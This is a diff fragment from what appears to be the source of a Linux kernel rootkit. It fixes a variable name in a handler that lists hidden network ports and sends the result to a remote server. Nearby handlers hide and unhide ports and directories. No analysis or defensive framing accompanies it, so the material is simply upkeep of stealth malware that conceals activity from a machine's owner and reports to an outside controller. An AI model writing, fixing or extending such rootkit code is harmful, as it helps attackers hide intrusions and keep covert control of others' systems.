@@ -83,13 +83,13 @@ static int unhide_port_handler(char *args) {
 
 static int list_hidden_port_handler(char *args) {
     char *buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
-    int r = port_list_get(buf, STD_BUFFER_SIZE);
+    int len = port_list_get(buf, STD_BUFFER_SIZE);
     if (len <= 0)
         send_to_server("No hidden entries");
     else
         send_to_server("%s", buf);
     kfree(buf);
-    return r;
+    return len;
 };
 
 static int hide_dir_handler(char *args) {
